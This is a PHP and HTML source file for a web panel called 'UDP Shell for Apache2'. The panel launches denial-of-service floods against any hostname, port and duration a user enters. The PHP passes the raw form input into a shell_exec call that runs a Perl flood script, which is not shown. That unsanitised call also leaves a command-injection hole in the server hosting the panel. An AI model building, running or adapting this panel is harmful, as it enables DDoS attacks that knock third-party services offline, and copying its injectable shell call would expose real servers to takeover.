<!DOCTYPE html>
<html>
<head>
<title>UDP Shell for Apache2#RooT</title>
</head>
<body style="cursor: default;text-align: center;-moz-user-select: none; -webkit-user-select: none; -ms-user-select:none; user-select:none;-o-user-select:none;">
<h2>Simple UDP Shell for Apache2 coded by Xpeedo for fake "h4x0rz"</h2>
<sub>DISACLAIMER: The coder isn't responsible for the damage made by you or other culprits.</sub><br></br>
<form method="post" action="">
<p>Hostname or IP:</p>
<input placeholder="1.3.3.7" type="text" name="hostname"><br>
<p>Port:</p>
<input type="number" placeholder="80" min="0" max="65535" name="port"><br>
<p>Time:</p>
<!-- Don't change to 0. 0 => permanent attack -->
<input type="number" min="1" placeholder="in seconds" max="65535" name="time"><br></br>
<input type="submit" value="Attack">
</form><br></br>
<span>Answer => </span>
</body>
</html>

<?php
if(isset($_POST['hostname']) && isset($_POST['port']) && isset($_POST['time'])) {
	$ip = $_POST['hostname'];
	$port = $_POST['port'];
	$time = $_POST['time'];
	if(preg_match(null,$ip) or $ip == "" or preg_match($ip,'.') == TRUE) {
		echo "Invalid IP!";
	} elseif($ip == "0.0.0.0" or $ip == "127.0.0.1" or $ip == "localhost" or /* VPS IP (ex: 123.123.123.123) => */$ip == "123.123.123.123" or /* Other IPs (ex: google.com, 1.2.3.4, xpeedo.net, mrreacher.com) => */$ip == "xpeedo.net") {
		echo "This IP can't be DDoSed!";
	} elseif($port < 0 or $port > 65535) {
		echo "Don't try to hack this Shell!";
	} elseif($time < 1) {
		echo "Permanent attack isn't allowed!";
	} else {
		$data = "perl /var/www/html/trex.pl ".$ip." ".$port." ".$time; //Your script + directory goes here.
		shell_exec($data);
		echo $ip." was attacked successfully on port ".$port." for ".$time." seconds.";
	}
}
?>